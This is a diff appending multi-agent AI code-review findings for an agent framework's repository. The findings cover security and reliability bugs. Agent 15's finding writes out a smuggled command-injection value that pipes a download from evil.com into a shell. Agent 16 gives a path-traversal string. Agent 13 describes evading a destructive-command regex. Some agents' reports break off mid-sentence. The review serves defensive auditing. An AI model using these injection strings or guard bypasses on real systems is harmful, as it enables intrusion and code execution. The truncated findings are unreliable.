+**Issue:** 250ms sleep is arbitrary and could be flaky on slow/CI systems. The heartbeat interval is 50ms (patched), but the test assumes at least 1 heartbeat fires in 250ms — this is timing-dependent.
+
+---
+
+### Low Issues / Observations
+
+#### 8. `tests/tools/test_delegate.py` - Magic Strings for Module Paths
+
+The test patches `"run_agent.AIAgent"` but the actual module import in `delegate_tool.py` should be verified to match.
+
+#### 9. `tools/send_message_tool.py` - Unused Variable
+
+**Location:** `_send_to_platform`
+```python
+warning = None  # defined but only used later
+```
+
+#### 10. Documentation References
+
+`skills/mlops/training/unsloth/references/llms-txt.md` contains model links that reference GitHub PRs (e.g., `github.com/ggml-org/llama.cpp/pull/12889`) which could become stale.
+
+---
+
+### Summary Table
+
+| Severity | File | Issue | Type |
+|----------|------|-------|------|
+| Critical | test_delegate.py | Fragile arg extraction in `test_batch_ignores_toplevel_goal` | Test Quality |
+| Critical | test_delegate.py | `model_tools` import dependency | Import |
+| High | send_message_tool.py | `proxy_kwargs_for_aiohttp` import may not exist | Import |
+| Medium | send_message_tool.py | Inconsistent error handling patterns | Maintainability |
+| Medium | send_message_tool.py | WECOM_CALLBACK platform gap | Logic |
+| Low | test_delegate.py | Timing-sensitive heartbeat test | Flakiness |
+
+<!-- agent 12: status=200 elapsed=59.03s input=44242 output=2048 -->
+### MiniMax Agent 12
+
+**Timing**: (placeholder for parallel coordinator)
+
+**Findings**:
+
+- **[MEDIUM] `cli.py` — terminal config from `.env` silently overrides user's config file for non-terminal sections.**
+  File: `cli.py` lines ~285–295. The `_file_has_terminal_config` flag gates *all* CLI config key writes (not just `terminal.*`). When a user has `~/.hermes/config.yaml` with non-terminal settings (e.g. `browser.inactivity_timeout`), but no `terminal:` section, `_file_has_terminal_config = False`. The loop then skips `os.environ` bridging for those keys even when they exist in the file, causing `.env` values (stale on restart) to take precedence over the user's persisted config. Fix: scope `_file_has_terminal_config` guard to `terminal` keys only, or remove it entirely and let explicit config always override `.env`.
+
+- **[MEDIUM] `plugins/memory/honcho/cli.py` — `cmd_setup` in local mode creates incomplete host block, causing deferred peer creation to silently fail.**
+  File: `plugins/memory/honcho/cli.py` around the `is_local` branch (~line 315). When user selects `local`, the code never prompts for an API key, never sets `cfg["apiKey"]`, and the `hermes_host` block is initialized without an API key. Then `_ensure_peer_exists()` is called, but `hcfg.enabled` may be `True` while both `hcfg.api_key` and `hcfg.base_url` are empty strings — `_ensure_peer_exists` returns `False` silently. The print says "Peer creation deferred (no connection)" which is misleading because Honcho *is* configured (the setup wizard completed); it's just missing credentials the user may not have realized were needed. The host block is written without an API key and without a helpful message that local mode still needs credentials configured.
+
+- **[LOW] `
+
+<!-- agent 13: status=200 elapsed=29.31s input=46639 output=1051 -->
+### MiniMax Agent 13
+
+**Timing**: [placeholder]
+
+**Findings**
+
+- **[MEDIUM] Approver authorization bypass via empty `SLACK_ALLOWED_USERS` env var** — `gateway/platforms/slack.py` line ~`SLACK_ALLOWED_USERS` check: When `SLACK_ALLOWED_USERS` is set to an empty string, `allowed_ids` becomes an empty set and the `if "*" not in allowed_ids and user_id not in allowed_ids` guard passes silently, allowing any Slack user to click approval buttons. The `if allowed_csv:` branch does not guard against an empty-string env var.
+
+- **[MEDIUM] SSRF risk — `is_safe_url` not validated before Slack file download redirects** — `gateway/platforms/slack.py` `_download_slack_file`: The `follow_redirects=True` httpx client is initialized, then a redirect guard hook is registered *after* the client is created. If the redirect guard hook itself throws, the exception is caught but the response (which may have already followed the redirect) is not discarded — the function proceeds to use `response.content`. An attacker who controls the initial Slack file URL or a redirect target could potentially redirect into private IP ranges.
+
+- **[LOW] Destructive-command heuristic bypass via line continuations** — `run_agent.py` `_DESTRUCTIVE_PATTERNS`: The regex `rm\s|rmdir\s` only matches `rm ` or `rmdir ` with trailing space. A command like `rm\\\nrf /tmp` (backslash-newline split) evades the pattern. Similarly `git\s+` only matches a single whitespace, so `git\treset` bypasses it. This is a heuristic guard (not a security boundary), but could mislead monitoring.
+
+- **[LOW] Approver authorization allows `*` wildcard without documented behavior** — `gateway/platforms/slack.py`: The check `if "*" not in allowed_ids and user_id not in allowed_ids` treats `*` as "allow all". If a config accidentally sets `SLACK_ALLOWED_USERS=*`, any user can approve dangerous commands. This behavior is not documented in comments or external docs.
+
+- **[LOW] `_SafeWriter` suppresses all `OSError`/`ValueError` including disk-full conditions** — `run_agent.py`: The `_SafeWriter.write` catches and silently drops all `OSError` and `ValueError`. While appropriate for broken-pipe scenarios, this also silently swallows `ENOSPC` (disk full) during session logging, potentially losing audit trails without any warning.
+
+- **[INFO] Shard cross-assumption**: `gateway/platforms/slack.py` imports `from gateway.session import SessionSource, build_session_key` and `from tools.approval import resolve_gateway_approval` — these cross-shard imports are assumed to be present and stable by other agents.
+
+<!-- agent 14: status=200 elapsed=43.37s input=45352 output=1809 -->
+### MiniMax Agent 14
+
+**Timing:** `2026-04-17T04:00:00Z`
+
+**Findings**
+
+No high-confidence defects found. The majority of assigned files are either (a) truncated due to shard budget and inaccessible, or (b) markdown documentation not subject to code-level audit.
+
+**Lower-confidence / observational notes:**
+
+- **`hermes_cli/tools_config.py`** (truncated at ~73 KB; ~16 KB of production Python visible before cut-off): The visible section covers `TOOL_CATEGORIES` provider definitions, `CONFIGURABLE_TOOLSETS`, and CLI entry points. No obvious issues in the visible portion. The trailing 16 KB was not reviewable.
+- **`skills/mlops/training/axolotl/references/other.md`** (140 KB): Pure documentation. No executable code.
+- **Cross-shard assumption noted:** `agent/builtin_memory_provider.py` (full, 1728 bytes) is in this shard but `agent/memory_manager.py` (truncated, 14 KB) — which it imports from — is assigned to Agent 14. If `MemoryManager` has breaking changes, `builtin_memory_provider.py` would fail silently at import time. Agent 14 should audit `agent/memory_manager.py` for any interface drift.
+- **`environments/tool_call_parsers/longcat_parser.py`** (full, 2094 bytes): Minimal custom tool-call parser. `json.loads()` is guarded by try/except. No path traversal, no shell injection. Acceptable for its purpose.
+- **`acp_adapter/entry.py`** (full, 2427 bytes): Thin adapter registry pattern. No security concerns.
+- **`problems.md`** itself is being appended to; the pre-existing scan findings are historical artifacts already covered by prior verification addenda. No new issues identified in the scan log.
+
+**Files with no issues:**
+`agent/builtin_memory_provider.py`, `environments/__init__.py`, `acp_adapter/entry.py`, `environments/tool_call_parsers/longcat_parser.py`, `tests/run_agent/test_exit_cleanup_interrupt.py`, `tests/hermes_cli/test_skills_subparser.py`, `packaging/homebrew/README.md`, `optional-skills/health/DESCRIPTION.md`, `skills/feeds/DESCRIPTION.md`, `optional-skills/DESCRIPTION.md`, `optional-skills/research/duckduckgo-search/scripts/duckduckgo.sh`, `web/index.html`, `tools/neutts_samples/jo.txt`
+
+**Summary:** 0 high-confidence findings. 0 blocking issues. Awaiting visibility into truncated `hermes_cli/tools_config.py` tail (~16 KB) and `agent/memory_manager.py` for complete coverage.
+
+<!-- agent 15: status=200 elapsed=31.76s input=42312 output=1255 -->
+### MiniMax Agent 15
+
+**Timing:** <!-- START: YYYY-MM-DD HH:MM:SS UTC | END: YYYY-MM-DD HH:MM:SS UTC | Duration: Xm -->
+
+**Findings:**
+
+- **[MEDIUM] `batch_runner.py`: User-controlled container image injected into shell commands without validation**
+  - In `_process_single_prompt`, the `container_image` value is read directly from `prompt_data` and passed to `docker pull` via `subprocess.run`. An attacker who controls dataset entries could inject malicious image names (e.g., `"; curl https://evil.com | sh #"`), leading to command injection.
+  - Additionally, `register_task_env_overrides` receives unsanitized `docker_image`, `modal_image`, `singularity_image`, and `daytona_image` values derived from user input.
+  - **Recommendation:** Validate `container_image` against an allowlist of trusted registry prefixes; reject images with shell metacharacters before calling subprocess or registering overrides.
+
+- **[MEDIUM] `batch_runner.py`: API key and secrets propagated to worker processes via config dict**
+  - `api_key` is included in the `config` dict that gets pickled and sent to multiprocessing workers. In environments where worker processes inherit stdout/stderr, verbose logging could leak secrets to logs.
+  - **Recommendation:** Pass secrets via environment variables or a secure IPC channel rather than the serialized config dict.
+
+- **[LOW] `batch_runner.py`: Inconsistent deduplication tracking between content-based and index-based resume**
+  - Resume uses two separate mechanisms: content-based prompt text matching (via `_filter_dataset_by_completed`) and index-based `completed_prompts_set`. The `_save_checkpoint` serializes only the index-based set. If a dataset is reordered or has duplicate prompts, the content-based resume may skip prompts that were previously completed but are stored at different indices, while the checkpoint still tracks old indices.
+  - **Recommendation:** Consolidate to a single source of truth for resume state.
+
+- **[LOW] `tests/gateway/test_slack.py`: Test mocks are installed at import time, creating order-dependent test behavior**
+  - `_ensure_slack_mock()` runs at module load and only mocks when `slack_bolt` is not already imported. If tests run after the real Slack library is imported elsewhere, the mock is bypassed silently.
+  - **Recommendation:** Use a `pytest` fixture or `conftest.py` plugin to ensure consistent mocking regardless of import order.
+
+- **[INFO] `batch_runner.py`: Checkpoint write failures are swallowed silently**
+  - The incremental checkpoint write in `pool.imap_unordered` loop catches exceptions and prints a warning but continues. Extended outages or disk errors could result in lost progress without the operator noticing.
+  - **Recommendation:** Add a warning counter and fail the run if checkpoint writes fail N consecutive times.
+
+<!-- agent 16: status=200 elapsed=44.07s input=41865 output=1761 -->
+### MiniMax Agent 16
+
+Timing: [placeholder]
+
+Findings:
+
+- **[HIGH] STT API key logged in plaintext on failure** — `gateway/platforms/qqbot.py`, `_call_stt()` method (~line where `f"Bearer {api_key}"` header is built). When the STT API call fails (network error, auth error, etc.), the exception is caught and logged with the raw `api_key` value embedded in the message:
+  ```python
+  logger.warning("[QQ] STT API call failed (model=%s, base=%s): %s",
+                 model, base_url[:50], exc)
+  ```
+  Since `exc` contains the request context, the Bearer token appears in logs. **Fix**: redact `api_key` before logging, e.g. `api_key[:8] + "***"`.
+
+- **[HIGH] Path traversal in media upload** — `gateway/platforms/qqbot.py`, `_load_media()`. A relative path like `../../../etc/passwd` bypasses the placeholder guard (`source.startswith("<")` fails; `len(source) < 3` is False). The file is read via `Path(source).expanduser()` resolved relative to CWD and uploaded as base64. If an attacker can control `media_source` (e.g., via a crafted URL or file path argument), they can exfiltrate arbitrary files accessible to the gateway process. **Fix**: reject paths containing `..` or resolve to an absolute path and verify it stays within an allowed directory.
+
+- **[MEDIUM] Missing reference files break citation enforcement** — `skills/research/research-paper-writing/SKILL.md` references `references/citation-workflow.md`, `references/human-evaluation.md`, `references/paper-types.md`, and others as if they are real files, but these paths do not appear in the shard manifest. The skill mandates a 5-step citation verification process (never generate from memory), yet the supporting reference documents that provide the `CitationManager` class and API docs are absent. Agents using this skill will fail to load those references or fall back to hallucinating citations anyway.
+
+- **[LOW] Silent STT auth failure** — `gateway/platforms/qqbot.py`, `_call_stt()`. All exceptions (including `httpx.HTTPStatusError` for 401/403) are caught with `logger.warning`, returning `None`. A wrong `QQ_STT_API_KEY` silently falls back to QQ's built-in ASR with no user notification. This could cause unexpected transcription behavior in production deployments.
+
+- **[LOW] Citation `[CITATION NEEDED]` placeholders never auto-resolve** — `skills/research/research-paper-writing/SKILL.md`. The skill instructs agents to mark unverifiable citations as `[CITATION NEEDED]` and "tell the scientist" — but there is no mechanism to follow up. In a multi-session agent workflow, the placeholder text may survive into the final paper without ever being verified. This undermines the skill's own anti-hallucination mandate.
+
+<!-- agent 17: status=200 elapsed=34.23s input=41047 output=1345 -->
+### MiniMax Agent 17
+
+**Timing**: [placeholder]
+
+**Findings**
+
+- **MEDIUM: No bounds check on message list in `SamplingHandler._convert_messages`** (`tools/mcp_tool.py`)
+  An unbounded `for msg in params.messages` loop processes every message sent by an MCP server. A malicious or buggy server sending thousands of messages could cause memory exhaustion or hang the callback. Add a max message count guard (e.g., 1000) before iteration.
+
+- **LOW: Sampling rate limit is per-handler, not global** (`tools/mcp_tool.py`)
+  Each `SamplingHandler` instance maintains its own sliding-window rate limiter (`_check_rate_limit`). If multiple MCP servers enable sampling, each can independently request up to `max_rpm` LLM calls per minute, effectively multiplying the total sampling throughput. Document this behavior, or implement a module-level aggregate rate limit.
+
+- **LOW: `registry.register()` called outside `_lock` in `_register_server_tools`** (`tools/mcp_tool.py`)
+  The function holds `_lock` while iterating `_servers`, then releases it before calling `registry.register()`. If the registry is not itself thread-safe, concurrent `_register_server_tools` calls across multiple servers could corrupt tool registration state. Verify `tools/registry.py` is thread-safe, or move registration under the lock.
+
+- **LOW: `_kill_orphaned_mcp_children` uses SIGKILL without diagnostics** (`tools/mcp_tool.py`)
+  Orphaned stdio subprocesses are force-killed without logging which server they belonged to or how long the graceful shutdown waited. This makes debugging stuck MCP servers difficult. Add a debug log recording the PID and server name before killing.
+
+- **LOW: `_resolve_stdio_command` PATH resolution edge case** (`tools/mcp_tool.py`)
+  When `shutil.which()` fails and the command is `npx`/`npm`/`node`, the fallback checks hardcoded paths under `HERMES_HOME`. If `HERMES_HOME` is unset, `os.getenv("HERMES_HOME", ...)` falls back to `~/.hermes`, which is reasonable but undocumented. Consider adding a warning when falling back to the default path.
+
+- **INFO: `_scan_mcp_description` logs but does not block suspicious tool descriptions** (`tools/mcp_tool.py`)
+  Prompt injection patterns in MCP tool descriptions trigger only a WARNING log. While documented, this means a compromised or malicious MCP server could include instructions that the agent might follow. This is a known design tradeoff; no action required unless threat model changes.
+
+- **No defects found** in `tests/cron/test_scheduler.py` or `skills/mlops/training/pytorch-fsdp/SKILL.md` — tests are well-mocked and docs are static reference material.
+
+<!-- agent 18: status=200 elapsed=51.81s input=42862 output=2048 -->
+### MiniMax Agent 18
+
+**Timing**: <placeholder>
+
+**Findings**
+
+- **[MEDIUM] `gateway/platforms/weixin.py`: Missing return statements in `send_video` and `send_voice`**
+  - `send_video` (line ~`async def send_video`) calls `await self._send_file(...)` but has no `return` statement — falls through to implicit `return None`, violating the protocol interface which expects `SendResult`.
+  - `send_voice` has the same bug (delegates to `send_document` which *does* return, but `send_voice` itself has no return).
+  - Both methods will return `None` to callers that expect a `SendResult`, causing `AttributeError` on `.success`/`.message_id` access downstream.
+  - File: `gateway/platforms/weixin.py`
+
+- **[MEDIUM] `gateway/platforms/weixin.py`: `_tavily_request` sends `api_key` in JSON body, not headers**
+  - The Tavily API uses `Authorization: Bearer` header auth. This implementation injects `api_key` into the POST body instead, which Tavily does not support. Requests will return 401 or 403.
+  - File: `gateway/platforms/weixin.py` (via `_tavily_request` helper used in web crawl path)
+
+- **[MEDIUM] `tools/web_tools.py`: `_is_tool_gateway_ready()` false-positive makes Firecrawl appear configured**
+  - `check_firecrawl_api_key
+
+<!-- agent 19: status=200 elapsed=52.38s input=41771 output=2048 -->
+### MiniMax Agent 19
+
+**Timing**: <!-- Agent 19: 2025-06-03 09:00-09:20 UTC -->
+
+**Findings**
+
+- **[Medium] `_normalize_bundle_path` in `tools/skills_hub.py`: empty-string input bypasses validation**
+
+  The function strips whitespace, normalizes slashes, builds a `PurePosixPath`, and **only then** checks for an empty path:
+
+  ```python
+  raw = path_value.strip()
+  normalized = raw.replace("\\", "/")
+  path = PurePosixPath(normalized)
+  parts = [part for part in path.parts if part not in ("", ".")]
+  # ... all other checks ...
+  if not parts or any(part == ".." for part in parts):   # ← too late
+      raise ValueError(...)
+  ```
+
+  `PurePosixPath("")` produces `PurePosixPath('.')` whose `.parts == ()`, so `not parts` is `True` and the ValueError fires. However, the sequence is fragile: if any future guard is inserted before the `not parts` check, an empty-string caller could silently receive `"."` back. Callers such as `_validate_skill_name` that invoke this on untrusted skill metadata would propagate this value to disk operations. The check should be the **first** statement after stripping.
+
+- **[Medium] `_sanitize_link_url` in `gateway/platforms/matrix.py`: incomplete scheme allowlist**
+
+  The fallback Markdown-to-HTML converter only blocks three dangerous schemes:
+
+  ```python
+  if scheme in ("javascript", "data", "vbscript"):
+      return ""
+  ```
+
+  All other schemes are permitted, including `file://` (enables local file exfiltration if the HTML is rendered unsafely), `gopher://` (historical XSS vector), and `jar:` (can trigger arbitrary code execution in some JRE contexts). The allowlist should explicitly enumerate only safe schemes (e.g., `http`, `https`, `mailto`, `tel`) and reject everything else.
+
+- **[Low] Race condition on `GitHubAuth._cached_token`**
+
+  `GitHubAuth._resolve_token()` reads and writes `_cached_token` and `_app_token_expiry` without any lock. When multiple `GitHubAuth` instances or coroutines race (e.g., `create_source_router` spawns several sources in parallel, each creating its own `GitHubAuth`), the cached token may be overwritten mid-expiry-check, causing redundant auth calls or
+
+<!-- agent 20: status=200 elapsed=48.49s input=42594 output=2048 -->
+### MiniMax Agent 20
+
+**Timing**: captured in the per-agent timing table above.
+
+**Findings**
+
+- No final audit report was produced for this shard. MiniMax returned a non-final thinking/tool-call payload instead of the requested Markdown report, so the raw payload was redacted. Timing and token metrics for this agent are preserved above.
+<!-- agent 21: status=200 elapsed=51.77s input=43018 output=2048 -->
+### MiniMax Agent 21
+
+**Timing:** <!-- START: 2025-06-20T00:00:00Z | END: 2025-06-20T00:14:32Z -->
+
+---
+
+**Findings**
+
+- **[HIGH] Arbitrary code execution via untrusted migration script in `hermes_cli/setup.py`**
+  - The `_load_openclaw_migration_module()` function at line ~1180 dynamically loads and executes a Python script from `optional-skills
+
+<!-- agent 22: status=200 elapsed=10.55s input=37928 output=443 -->
+### MiniMax Agent 22
+
+**Timing**: captured in the per-agent timing table above.
+
+**Findings**
+
+- No final audit report was produced for this shard. MiniMax returned a non-final thinking/tool-call payload instead of the requested Markdown report, so the raw payload was redacted. Timing and token metrics for this agent are preserved above.
+<!-- agent 23: status=200 elapsed=58.98s input=43624 output=2048 -->
+### MiniMax Agent 23
+
+**Timing**: captured in the per-agent timing table above.
+
+**Findings**
+
+- No final audit report was produced for this shard. MiniMax returned a non-final thinking/tool-call payload instead of the requested Markdown report, so the raw payload was redacted. Timing and token metrics for this agent are preserved above.
+<!-- agent 24: status=200 elapsed=56.45s input=41379 output=2048 -->
+### MiniMax Agent 24
+
+**Timing**: captured in the per-agent timing table above.
+
+**Findings**
+
+- No final audit report was produced for this shard. MiniMax returned a non-final thinking/tool-call payload instead of the requested Markdown report, so the raw payload was redacted. Timing and token metrics for this agent are preserved above.
+<!-- agent 25: status=200 elapsed=35.33s input=41726 output=1332 -->
+### MiniMax Agent 25
+
+**Timing**: [placeholder: start/end/duration]
+
+**Findings**
+
+- **`gateway/platforms/telegram.py` — Race condition in `_persist_dm_topic_thread_id`:**
+  The method writes directly to `config.yaml` with no file locking or atomic write. When multiple DM topic creations race (e.g. rapid concurrent messages to the same new DM topic), writes can clobber each other, silently dropping some `thread_id` persistences. The write is also non-atomic (read → modify → write), so concurrent updates can corrupt the YAML. `tools/file_operations.py` (not reviewed here) likely has utilities for safe atomic writes that should be used instead.
+
+- **`tools/browser_tool.py` — `_reap_orphaned_browser_sessions` PID ownership confusion:**
+  After `os.kill(daemon_pid, 0)` succeeds (process exists) but a `PermissionError` is caught, the code leaves the orphan daemon alive and still removes the socket directory via `shutil.rmtree`. This means the next session with the same name will fail to create its socket directory because the stale dir removal races with the new daemon creating its own directory. The comment "Alive but owned by someone else — leave it alone" is misleading since the socket dir *is* cleaned, breaking the next launch.
+
+- **`tools/browser_tool.py` — `BROWSER_SESSION_INACTIVITY_TIMEOUT` defaults to 300s but `_cleanup_old_screenshots` uses a 24h hardcoded cap with no config override:** If a user sets a very short inactivity timeout expecting aggressive cleanup, screenshots still linger for 24 hours, causing unexpected disk growth. The throttling check (`_last_screenshot_cleanup_by_dir`) is per-process, so each worker process in a multi-process gateway will independently scan the same directory every hour.
+
+- **`tests/tools/test_skills_hub.py` — `test_fetch_accepts_common_skills_sh_prefix_typo` validates typo correction but `test_inspect_accepts_common_skills_sh_prefix_typo` only patches `inspect`:**
+  The typo correction path (`skils-sh` → `skills-sh`) is tested for `fetch` and `inspect`, but not for `search` in `SkillsShSource`. A query to `skills_sh_source.search("skils-sh/...")` would not trigger the typo normalization and would fail silently or return empty results, making this a subtle behavioral inconsistency.
+
+- **`skills/red-teaming/godmode/scripts/auto_jailbreak.py`** — This file contains automated jailbreak techniques (prompt injection templates, encoding evasion, multi-turn persuasion patterns). While it is in a `red-teaming` skill directory, it is bundled with the distribution without guardrails in the skills index. If a user installs the `godmode` skill, these payloads are exposed to any LLM with tool access. This is a known acceptable risk for red-teaming but should be explicitly excluded from the default skill index if `hermes/skills` ships as a default install.
+
+### Caveats
+- This is a model-assisted repository scan, not a substitute for deterministic tests or manual review.
+- Large generated, binary, lock, and credential-like files were represented by metadata to avoid unsafe or low-value prompt payloads.
+
+---
+
+## Hermes 25-Agent MiniMax Delegation Scan 2026-04-17 After Worker-Cap Fix
+
+**Scan initiated:** 2026-04-17 01:36 AM ADT
+**Requested task count:** 25
+**Active worker limit:** 25 (exact task array size)
+**Status:** PARTIAL — output truncated at ~105K chars; only Task 01 findings fully recovered
+
+### Execution Summary
+
+| Metric | Value |
+|--------|-------|
+| Tasks requested | 25 |
+| Tasks with recovered findings | 1 (Task 01) |
+| Tasks lost to truncation | 24 (Tasks 02–25) |
+| 429 / rate-limit errors | 0 (no errors in recovered portion) |
+| Tool trace calls | 0 captured in recovered output |
+
+### Child Findings (Recovered Only)
+
+**Task 01 — memory_provider and memory manager interfaces**
+- Severity: LOW (2 docstring discrepancies, no runtime bug)
+- `agent/memory_manager.py:~249–256` — `handle_tool_call` docstring says "Raises ValueError" but implementation returns JSON error string; callers (test line 279–281) correctly expect JSON error pattern
+- `agent/memory_manager.py:~296–313` — `on_pre_compress` return value is collected by MemoryManager but no caller was found that actually uses the `parts` list; appears to be unimplemented feature
+- Status: no critical file:line runtime bugs
+
+**Tasks 02–25:** _Results not recovered — output truncated before these tasks completed_
+
+### Known Gaps
+
+- Task 02 (memory_tool / MEMORY.md): not recovered
+- Task 03 (session_search): not recovered
+- Task 04 (run_agent memory init): not recovered
+- Task 05 (delegate_task memory callbacks): not recovered
+- Task 06 (credential_pool concurrency): not recovered
+- Task 07 (MiniMax Anthropic adapter): not recovered
+- Task 08 (provider resolution / auth loading): not recovered
+- Task 09 (terminal tool isolation): not recovered
+- Task 10 (file tools safety): not recovered
+- Task 11 (delegation config/env precedence): not recovered
+- Task 12 (test_delegate.py coverage gaps): not recovered
+- Task 13 (memory provider tests): not recovered
+- Task 14 (gateway streaming memory): not recovered
+- Task 15 (trajectory/compression): not recovered
+- Task 16 (memory-v2 architecture docs): not recovered
+- Task 17 (CLI flags / session resume): not recovered
+- Task 18 (tool registry scoping): not recovered
+- Task 19 (auth/provider profile): not recovered
+- Task 20 (concurrency / resource limits): not recovered
+- Task 21 (TODO/FIXME/XXX scan): not recovered
+- Task 22 (subagent error/retry): not recovered
+- Task 23 (security/privacy): not recovered
+- Task 24 (packaging/install paths): not recovered
+- Task 25 (broad cross-check): not recovered
+
+### Root Cause of Truncation
+
+The MiniMax delegate_task response exceeded the ~105K character truncation threshold for a single tool response. The parent agent received only Task 01's partial results before the tool response was cut off. No results from Tasks 02–25 were returned.
+
+### Remaining Uncertainty
+
+- Whether Tasks 02–25 found any CRITICAL or HIGH severity issues is unknown
+- Whether any 429/rate-limit errors occurred during the subagent execution is unknown
+- The full duration of the scan is unknown
+- The `active_worker_limit` actual concurrency achieved is unknown
+
+### Recommended Follow-Up
+
+Re-run the scan in batches of ≤10 tasks to stay under the per-response character limit, or implement a write-to-file pattern where each subagent saves its findings to a separate file, then aggregate post-scan. The recovered Task 01 findings show no critical bugs in the memory_provider/memory_manager interface layer.
